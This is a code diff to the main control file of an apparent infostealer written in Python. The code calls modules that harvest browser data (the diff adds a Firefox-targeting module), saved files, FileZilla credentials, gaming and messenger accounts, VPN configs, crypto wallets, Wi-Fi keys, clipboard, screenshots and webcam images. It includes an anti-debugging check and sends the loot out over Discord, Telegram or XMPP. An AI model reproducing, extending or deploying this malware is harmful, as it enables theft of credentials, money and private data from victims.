@@ -30,7 +30,7 @@ from games import Uplay
 from config import config
 from manager import ending
 from messengers import viber
-from browsers import browsers
+from browsers import chromium
 from files import Files_txt
 from files import file_grubber
 from secure import antiDebug
@@ -40,6 +40,7 @@ from messengers import pidgin
 from system import productkey
 from system import wifi
 from system import clipboard
+from browsers import geckodriver
 
 def Start() -> None:
     if not config.Config.debuging:
@@ -47,43 +48,44 @@ def Start() -> None:
     make_folder.makeFolders(config.Config.enableFileGrubber,config.Config.oneStart)
 def GrubFiles() -> None:
     if config.Config.enableFileGrubber:
-        config.Config.dataForMassageFiles= file_grubber.Grab(config.Config.dataForMassageFiles)
+        config.Config.msgFiles= file_grubber.Grab(config.Config.msgFiles)
     else:
         Files_txt.TxtSteal()
     filezilla.FileZilla()
 
 def Browsers() -> None:
-    browsers.Browsers()
-    config.Config.dataForMassageBrowsers = browsers.Browsers.Return()
+    chromium.Browsers()
+    config.Config.msgBrowsers = chromium.Browsers.Return()
+    config.Config.msgBrowsers = geckodriver.GeckoDriver(config.Config.msgBrowsers)
 
 def Games() -> None:
-    config.Config.dataForMassageOther = epicGames.Epic(config.Config.dataForMassageOther)
-    config.Config.dataForMassageOther = Uplay.Ubisoft(config.Config.dataForMassageOther)
-    config.Config.dataForMassageOther = Minecraft.Minecraft(config.Config.dataForMassageOther)
-    config.Config.dataForMassageOther = roblox.roblox(config.Config.dataForMassageOther)
-    config.Config.dataForMassageOther = steam.Steam(config.Config.dataForMassageOther)
-    config.Config.dataForMassageOther =BattleNET.BattleNet(config.Config.dataForMassageOther)
+    config.Config.msgOther = epicGames.Epic(config.Config.msgOther)
+    config.Config.msgOther = Uplay.Ubisoft(config.Config.msgOther)
+    config.Config.msgOther = Minecraft.Minecraft(config.Config.msgOther)
+    config.Config.msgOther = roblox.roblox(config.Config.msgOther)
+    config.Config.msgOther = steam.Steam(config.Config.msgOther)
+    config.Config.msgOther =BattleNET.BattleNet(config.Config.msgOther)
 
 def Messagers() -> None:
-    config.Config.dataForMassageOther = skype.skype(config.Config.dataForMassageOther)
-    config.Config.dataForMassageOther = telegram.Telegram(config.Config.dataForMassageOther)
-    config.Config.dataForMassageOther = viber.Viber(config.Config.dataForMassageOther)
-    config.Config.dataForMassageOther = discord.Discord(config.Config.dataForMassageOther)
-    config.Config.dataForMassageOther = whatsapp.WhatsApp(config.Config.dataForMassageOther)
-    config.Config.dataForMassageOther = pidgin.Pidgin(config.Config.dataForMassageOther)
+    config.Config.msgOther = skype.skype(config.Config.msgOther)
+    config.Config.msgOther = telegram.Telegram(config.Config.msgOther)
+    config.Config.msgOther = viber.Viber(config.Config.msgOther)
+    config.Config.msgOther = discord.Discord(config.Config.msgOther)
+    config.Config.msgOther = whatsapp.WhatsApp(config.Config.msgOther)
+    config.Config.msgOther = pidgin.Pidgin(config.Config.msgOther)
 
 def VPN() -> None:
-    config.Config.dataForMassageVPN= vpn.VPN(config.Config.dataForMassageVPN)
+    config.Config.msgVPN= vpn.VPN(config.Config.msgVPN)
 
 def System() -> None:
-    config.Config.dataForMassageSYS = system_info.SystemInfo(config.Config.dataForMassageSYS)
+    config.Config.msgSYS = system_info.SystemInfo(config.Config.msgSYS)
     productkey.PKay()
     wifi.Wifi()
     clipboard.ClipBoard()
 
 
 def Other() -> None:
-    config.Config.dataForMassageWallets = wallets.Wallets(config.Config.dataForMassageWallets)
+    config.Config.msgWallets = wallets.Wallets(config.Config.msgWallets)
     programs.Programs()
     photos.Screenshot()
     photos.WebCam()
@@ -94,7 +96,7 @@ def End() -> None:
     except Exception as e:
         print(e)
     try:
-        send.Send(config.Config.sendType,config.Config.np,config.Config.dataForMassageSYS,config.Config.dataForMassageBrowsers,config.Config.dataForMassageOther,config.Config.dataForMassageWallets,config.Config.dataForMassageFiles,config.Config.dataForMassageVPN,config.Config.discordData,config.Config.TelegramData,config.Config.xmppData)
+        send.Send(config.Config.sendType,config.Config.np,config.Config.msgSYS,config.Config.msgBrowsers,config.Config.msgOther,config.Config.msgWallets,config.Config.msgFiles,config.Config.msgVPN,config.Config.discordData,config.Config.TelegramData,config.Config.xmppData)
     except Exception as e:
         print(e)
     ending.End(config.Config.np)
